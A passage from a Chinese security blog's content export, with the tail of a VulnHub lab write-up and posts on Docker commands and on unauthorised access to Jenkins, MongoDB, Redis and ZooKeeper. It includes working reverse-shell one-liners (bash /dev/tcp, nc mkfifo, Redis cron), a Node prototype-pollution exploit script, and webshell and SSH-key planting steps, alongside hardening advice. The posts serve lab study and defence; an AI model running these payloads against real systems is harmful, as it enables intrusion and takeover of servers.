<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://p6.is:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    None, f<span class="string">&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://p6.is:7777&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>随后获得另外一个用户的shell,用户目录下存在一个flag文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l  查看当前用户的sudo权限</span><br><span class="line"></span><br><span class="line">执行后发现当前用户可以无密码sudo执行npm,node</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo node -e <span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 9999 &gt;/tmp/m&#x27;)&quot;</span> </span><br><span class="line"></span><br><span class="line">使用sudo权限执行node,通过node调用nc反弹shell,获得root权限</span><br><span class="line">root目录下存在第二个flag</span><br></pre></td></tr></table></figure>



<h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>


]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>web</tag>
        <tag>all</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用参考</title>
    <url>/2022/11/26/docker1/</url>
    <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p>
</div></div><div class='timeline-item-content'><h6 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h6><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p>
<p>描述: Docker 是一个用于开发、交付和运行应用程序的开放平台。 Docker 使您能够将应用程序与基础架构分开，以便 您可以快速交付软件。使用 Docker，您可以管理您的基础架构 以与管理应用程序相同的方式。通过利用 Docker 的 快速传送、测试和部署代码的方法，您可以 显著减少编写代码和在生产环境中运行代码之间的延迟。</p>
</div></div></div>


<h1 id="基础教程"><a href="#基础教程" class="headerlink" title="基础教程"></a>基础教程</h1><div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p>
</div></div><div class='timeline-item-content'><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps	列出正在运行的容器</span><br><span class="line">docker ps -a	列出所有容器</span><br><span class="line">docker ps -s	列出正在运行的容器 (带 CPU / 内存)</span><br><span class="line">docker images	列出所有镜像</span><br><span class="line">docker exec -it &lt;container&gt;  bash	连接到容器</span><br><span class="line">docker logs &lt;container&gt;	显示容器的控制台日志</span><br><span class="line">docker stop &lt;container&gt;	停止容器</span><br><span class="line">docker restart &lt;container&gt;	重启一个容器</span><br><span class="line">docker rm &lt;container&gt;	移除一个容器</span><br><span class="line">docker port &lt;container&gt;	显示容器的端口映射</span><br><span class="line">docker top &lt;container&gt;	列出进程</span><br><span class="line">docker kill &lt;container&gt;	杀死一个容器</span><br><span class="line"></span><br><span class="line">docker start nginx-server	开始</span><br><span class="line">docker stop nginx-server	停止</span><br><span class="line">docker restart nginx-server	重启</span><br><span class="line">docker pause nginx-server	暂停</span><br><span class="line">docker unpause nginx-server	取消暂停</span><br><span class="line">docker wait nginx-server	阻塞容器</span><br><span class="line">docker kill nginx-server	发送 SIGKILL</span><br><span class="line">docker attach nginx-server	连接到现有容器</span><br><span class="line">docker pull 镜像   从docker registry中拉取镜像</span><br><span class="line"></span><br><span class="line">docker ps	列出正在运行的容器</span><br><span class="line">docker ps -a	列出所有容器</span><br><span class="line">docker logs nginx-server	容器日志</span><br><span class="line">docker inspect nginx-server	检查容器</span><br><span class="line">docker events nginx-server	容器事件</span><br><span class="line">docker port nginx-server	公共端口</span><br><span class="line">docker top nginx-server	运行进程</span><br><span class="line">docker stats nginx-server	容器资源使用</span><br><span class="line">docker diff nginx-server	列出对容器所做的更改</span><br><span class="line"></span><br><span class="line">docker images	列出镜像</span><br><span class="line">docker rmi nginx	删除镜像</span><br><span class="line">docker load &lt; ubuntu.tar.gz	加载一个 tarred 存储库</span><br><span class="line">docker load --input ubuntu.tar	加载一个 tarred 存储库</span><br><span class="line">docker save busybox &gt; ubuntu.tar	将镜像保存到 tar 存档</span><br><span class="line">docker history	显示镜像的历史</span><br><span class="line">docker commit nginx	将容器另存为镜像。</span><br><span class="line">docker tag nginx eon01/nginx	标记镜像</span><br><span class="line">docker push eon01/nginx	推送镜像</span><br><span class="line"></span><br><span class="line">docker run -d -p 80:80 docker/imagesname  -d后台允许，-p端口映射</span><br><span class="line">docker run -it ubuntu /bin/bash   -i交互式  -t终端</span><br><span class="line"></span><br><span class="line">docker exec id   shell command  容器执行命令</span><br><span class="line">docker exec -u root -it imagesname  /bin/bash</span><br><span class="line">docker exec -it 容器名称 sh  从正在运行的容器中打开一个shell </span><br><span class="line"></span><br><span class="line">docker ps -a 列出所有docker容器（包括停止的）</span><br><span class="line">docker start | stop 容器名称 启动或停止现有容器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下载dockerfile，json文件</span><br><span class="line">docker build -t setname    编译镜像，设置名为setname</span><br><span class="line"></span><br><span class="line">更新源代码，重新编译，运行，删除旧容器才可以适用新容器</span><br><span class="line"></span><br><span class="line">删除容器</span><br><span class="line">docker ps 列出获取容器id</span><br><span class="line">docker stop id   停止容器</span><br><span class="line">docker rm id  停止容器后删除容器</span><br><span class="line">docker rm -f id 停止并且删除</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">docker ps -a  列出所有容器</span><br><span class="line">docker kill id 杀死运行中的容器</span><br><span class="line">docker images 列出docker镜像</span><br><span class="line">docker rmi id 删除镜像</span><br><span class="line">docker system prune  删除与容器无关镜像，容器，卷，网络</span><br><span class="line">docker system prune -a 删除任何停止的容器和所有未使用的图像（不仅仅是悬空的图像）</span><br><span class="line">rm -R /var/lib/docker   删除docker数据目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker容器移除后数据不会保存（持久化数据设置）</span><br><span class="line">docker volume create todo-db 创建数据库</span><br><span class="line">设置镜像不能运行，删除后开始设置</span><br><span class="line">docker run -dp 80:80 -v todo-db:/etc/todos images-name  运行时指定卷安装</span><br><span class="line">删除后启动，数据不会清除，</span><br><span class="line">docker volume inspect todo-db 查看卷信息，数据位置信息</span><br><span class="line"></span><br><span class="line">适用绑定挂载（持久化数据，可以控制确切挂载点，实时修改）</span><br><span class="line">docker run -dp 3000:3000 \</span><br><span class="line">     -w /app -v &quot;$(pwd):/app&quot; \</span><br><span class="line">     node:12-alpine \</span><br><span class="line">-w 指定工作目录</span><br><span class="line">-v 将容器种主机当前目录挂载到工作目录</span><br><span class="line"></span><br><span class="line">docker logs -f 容器名称     获取并查看容器日志</span><br></pre></td></tr></table></figure>

</div></div></div>

<div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p>
</div></div><div class='timeline-item-content'><h6 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h6><p><a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a><br><a href="https://quickref.cn/docs/docker.html">https://quickref.cn/docs/docker.html</a></p>
</div></div></div>




<h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>


]]></content>
      <categories>
        <category>tool</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>all</tag>
        <tag>docker</tag>
        <tag>tool</tag>
        <tag>skill</tag>
      </tags>
  </entry>
  <entry>
    <title>JenKins 未授权访问</title>
    <url>/2023/05/16/jenkins/</url>
    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
</div>

<div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
</div>

<div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
</div>

<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-16</p>
</div></div><div class='timeline-item-content'><p>永远新的开始啊</p>
<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>默认情况下 Jenkins 面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>命令执行地址</p>
<p><a href="http://192.168.56.114:8080/script">http://192.168.56.114:8080/script</a></p>
<p><a href="http://192.168.56.114:8080/manage">http://192.168.56.114:8080/manage</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">命令执行</span><br><span class="line">println <span class="string">&quot;ifconfig -a&quot;</span>.execute().text    执行ifconfig  命令</span><br><span class="line">println <span class="string">&quot;wget  http://127.0.0.1/1.py&quot;</span>.execute().text     下载py文件反弹shell</span><br><span class="line"></span><br><span class="line">写文件shell</span><br><span class="line">new File(<span class="string">&quot;/tmp/1.py&quot;</span>).write(<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>);      使用命令写入文件1.py 随后执行命令反弹</span><br><span class="line"></span><br><span class="line">写websehll 文件</span><br><span class="line">new File(<span class="string">&quot;/var/www/html/1.php&quot;</span>).write(<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ul>
<li>禁止 jenkins 暴露在公网</li>
<li>添加认证,设置复杂密码以及账号锁定</li>
</ul>
<h1 id="相关CVE"><a href="#相关CVE" class="headerlink" title="相关CVE"></a>相关CVE</h1><p>CVE-2017-1000353</p>
<p>CVE-2018-1000861</p>
</div></div></div>

<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>

]]></content>
      <categories>
        <category>未授权访问</category>
        <category>jenkins</category>
      </categories>
      <tags>
        <tag>未授权访问</tag>
        <tag>jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 未授权访问</title>
    <url>/2023/05/16/mongodb/</url>
    <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<div class="timeline #5effff"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-16</p>
</div></div><div class='timeline-item-content'><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>默认开启 MongoDB 服务不添加任何参数时，是没有任何权限验证的，可以直接无密码连接登陆，端口 27017</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mongo  --host ip  --port 27017  直接连接数据库</span><br></pre></td></tr></table></figure>

<h1 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h1><ul>
<li>为 MongoDB 添加认证</li>
<li>启动时候添加 —auth参数</li>
<li>给 MongoDB 添加用户</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use admin <span class="comment">#使用admin库</span></span><br><span class="line"></span><br><span class="line">db.addUser(<span class="string">&quot;root&quot;</span>, <span class="string">&quot;123456&quot;</span>) <span class="comment">#添加用户名root密码123456的用户</span></span><br><span class="line"></span><br><span class="line">db.auth(<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>) <span class="comment">#验证下是否添加成功，返回1说明成功</span></span><br></pre></td></tr></table></figure>

<ul>
<li>禁用HTTP 和REST 端口</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MongoDB 自身带有一个 HTTP 服务和并支持 REST 接口。</span><br><span class="line">在2.6以后这些接口默认是关闭的。mongoDB 默认会使用默认端口监听web服务，</span><br><span class="line">一般不需要通过 web 方式进行远程管理，建议禁用。</span><br><span class="line">修改配置文件或在启动的时候选择 –nohttpinterface 参数 nohttpinterface=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<ul>
<li>限制绑定ip</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">启动时加入参数--bind_ip 127.0.0.1</span><br><span class="line"></span><br><span class="line">或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure>

</div></div></div>

<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>

]]></content>
      <categories>
        <category>未授权访问</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>未授权访问</tag>
        <tag>漏洞复现</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>redis 未授权访问</title>
    <url>/2023/05/15/redis/</url>
    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
</div>

<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-15</p>
</div></div><div class='timeline-item-content'><p>永远新的开始啊</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Redis 在某些情况下，绑定在0.0.0.0 暴露公网访问的时候，没有防火墙策略，没有密码认证的情况下，会导致任意目标访问 redis 以及读取写入数据。</p>
<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul>
<li>绑定在 0.0.0.0:6379，没有安全策略ip限制，直接暴露在公网</li>
<li>没有设置 redis 密码认证，可以免密码登陆</li>
<li>高级利用，root 身份运行</li>
</ul>
<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul>
<li>centos 7</li>
<li>redis <code>wget http://download.redis.io/releases/redis-4.0.8.tar.gz</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> redis</span><br><span class="line">make</span><br><span class="line">make install 将redis-cli redis-server 安装到/usr/bin</span><br><span class="line"><span class="built_in">cp</span> redis.conf /etc</span><br><span class="line">修改redis.conf 配置文件 <span class="built_in">bind</span> 0.0.0.0,关闭密码认证，关闭服务器防火墙</span><br><span class="line">root启动</span><br></pre></td></tr></table></figure>

<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">安装 redis-cli</span><br><span class="line">yay -S redis</span><br><span class="line">redis-cli -h 192.168.56.110  连接redis</span><br><span class="line"></span><br><span class="line">**数据泄漏**</span><br><span class="line">keys *   获取所有 keys 值</span><br><span class="line"></span><br><span class="line">**系统信息**</span><br><span class="line">info    获取系统信息，redis版本，系统信息等</span><br><span class="line"></span><br><span class="line">**webshell**</span><br><span class="line"><span class="comment"># 写入一个string内容</span></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n&lt;?=`<span class="variable">$_GET</span>[0]`?&gt;\n\n&quot;</span>    \n换行，防止写入数据混乱</span><br><span class="line"><span class="comment"># 设置备份目录</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line"><span class="comment"># 设置备份文件名</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="comment"># 保存文件到本地</span></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入 SSH 公钥登陆无密码登陆目标系统**</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa　　//执行生成key命令</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份文件目录设置为对应的 .ssh，一般默认为 /root/.ssh/</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存key的时候加上两个`\n`是为了避免和Redis里其他缓存数据混合</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> key <span class="string">&quot;\n\n\生成的公钥n\n&quot;</span></span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入计划任务 crontab 运行命令，获取shell**</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.110.141/4789 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>修复方式</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></h1><ul>
<li>bind 127.0.0.1  只对本地开放</li>
<li>requirepass password  设置密码认证</li>
<li>修改默认端口</li>
<li>设置防火墙规则</li>
</ul>
</div></div></div>

<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>

]]></content>
      <categories>
        <category>未授权访问</category>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>ZooKeeper 未授权访问</title>
    <url>/2023/05/16/zookeeper/</url>
    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
</div>

<div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
</div>

<div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
</div>

<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-16</p>
</div></div><div class='timeline-item-content'><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Zookeeper 的默认开放端口是2181。Zookeeper 安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用 Zookeeper，通过服务器收集敏感信息或者在 Zookeeper 集群内进行破坏</p>
<p>比如：kill命令。攻击者能够执行所有只允许由管理员运行的命令。</p>
<p>默认运行在 2181 端口</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14-bin.tar.gz</span><br><span class="line"></span><br><span class="line">tar -xvf  filename.tar.gz  解包</span><br><span class="line"><span class="built_in">cd</span>  zookeeper/src       </span><br><span class="line"><span class="built_in">mv</span> zoo_sample.cfg zoo.cfg   进入目录修改配置文件名称未zoo.cfg</span><br><span class="line">../bin/zkServer.sh start 启动服务</span><br></pre></td></tr></table></figure>

<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> conf | nc xx.xx.xx.xx 2181   </span><br><span class="line">conf命令输出相关服务配置的详细信息，端口、数据路径、日志路径、session 超时时间，最大连接数等。</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> cons | nc xx.xx.xx.xx 2181 | more</span><br><span class="line">列出所有连接到当前服务器的客户端/会话的详细信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> dump | nc xx.xx.xx.xx 2181 | more</span><br><span class="line">输出未处理的会话和临时节点，leader 节点有效。</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> envi | nc xx.xx.xx.xx 2181</span><br><span class="line">输出服务器详细信息</span><br><span class="line"></span><br><span class="line">./zkCli.sh -server x.x.x.x:2181  </span><br><span class="line">直接连接服务测试，执行命令</span><br></pre></td></tr></table></figure>

<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul>
<li>禁止把 Zookeeper 直接暴露在公网</li>
<li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</li>
<li>绑定指定 IP 访问</li>
</ul>
</div></div></div>

<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>

]]></content>
      <categories>
        <category>未授权访问</category>
        <category>ZooKeeper</category>
      </categories>
      <tags>
        <tag>ZooKeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>关于作者</title>
    <url>/about/index.html</url>
    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-brands fa-redhat"></i><p>个人简介</p>
</div>
<div class="note blue modern"><p>昵称：方糖<br>年龄：18<br>性别：男</p>
</div>
<div class="note blue modern"><p>座右铭：怎么开心怎么来<br>人生观：怎么开心怎么来<br>学习观：怎么开心怎么来<br>价值观：怎么开心怎么来</p>
</div>


]]></content>
  </entry>
  <entry>
    <title>书籍</title>
    <url>/books/index.html</url>
    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
</div>

]]></content>
  </entry>
  <entry>
    <title>  </title>
    <url>/archlinux/index.html</url>
    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>arch linux 一个很棒的linux发行版</p>
</div>



]]></content>
  </entry>
  <entry>
    <title>分类</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>图库</title>
    <url>/images/index.html</url>
    <content><![CDATA[<div class="gallery-group-main">

  <figure class="gallery-group">
  <img class="gallery-group-img no-lightbox" src='https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7f362750-a16a-4c0b-a648-1b7257dcc079%2F67b0bdc2af904ca28958c94f53748868.jpg?table=block&id=b966da21-7382-48eb-9709-1650445508c2&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2' alt="Group Image Gallery">
  <figcaption>
  <div class="gallery-group-name">壁纸</div>
  <p>喜欢的图片</p>
  <a href='/images/tupian/'></a>
  </figcaption>
  </figure>
  

  <figure class="gallery-group">
  <img class="gallery-group-img no-lightbox" src='https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0ba35ba7-0595-4df3-9554-8a173658bf56%2Ff00560e3b4aa41318e39d77bb2776829.jpg?table=block&id=d818de25-29ec-49da-a19d-3ec6a392271f&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2' alt="Group Image Gallery">
  <figcaption>
  <div class="gallery-group-name">理想</div>
  <p>喜欢的图片</p>
  <a href='/images/tupian/'></a>
  </figcaption>
  </figure>
  

  <figure class="gallery-group">
